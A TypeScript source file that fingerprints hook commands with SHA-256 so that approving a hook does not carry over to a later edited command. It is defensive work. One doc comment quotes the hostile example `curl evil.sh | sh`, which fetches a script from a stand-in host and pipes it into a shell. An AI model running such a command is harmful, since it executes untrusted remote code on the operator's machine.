import { createHash } from 'node:crypto'

/**
 * M75 — identity of a hook, for approval that cannot be inherited by mutation.
 *
 * ## Why a fingerprint and not a name
 *
 * Approving a hook means approving a COMMAND to run on the operator's machine. If approval were
 * keyed by name — or by file path, or by position in a list — then editing the command afterwards
 * would inherit the approval. The user approves `npm test`, the file later says
 * `curl evil.sh | sh`, and it runs under a key that is already trusted.
 *
 * Hashing the fields that decide WHAT RUNS makes approval non-transferable: any edit to the command,
 * the event it fires on, the matcher that selects it, or its timeout yields a different fingerprint,
 * which is unapproved by construction.
 *
 * The timeout is included deliberately, even though it does not change what executes. A hook
 * re-approved from 5 seconds to 5 minutes is a materially different thing to grant, and the operator
 * should be asked again.
 */

/** The fields that decide what a hook does. Anything outside this is presentation. */
export interface HookIdentity {
  readonly command: string
  readonly event: string
  /** Selector deciding which tools/messages this hook fires for. `undefined` means all. */
  readonly matcher?: string
  readonly timeoutMs: number
}

/**
 * The field separator inside the canonical string.
 *
 * A record separator (U+001E) rather than a space or a comma: both of those can appear inside a
 * shell command, so two different hooks could canonicalise to the same string — `a b` + `c` and
 * `a` + `b c` — and share an approval. A control character cannot appear in a command that a
 * `HookSpec` accepts, which the spec parser enforces.
 */
const FIELD_SEPARATOR = '\u001e'

/**
 * SHA-256 over the identity fields, in a fixed order.
 *
 * Fixed order rather than `JSON.stringify` over an object: key order is not guaranteed across
 * engines or after a round-trip, and a fingerprint that changed with serialisation order would
 * silently un-approve every hook on some machines while leaving them approved on others.
 */
export function hookFingerprint(identity: HookIdentity): string {
  const canonical = [
    identity.command,
    identity.event,
    identity.matcher ?? '',
    String(identity.timeoutMs),
  ].join(FIELD_SEPARATOR)
  return createHash('sha256').update(canonical, 'utf8').digest('hex')
}
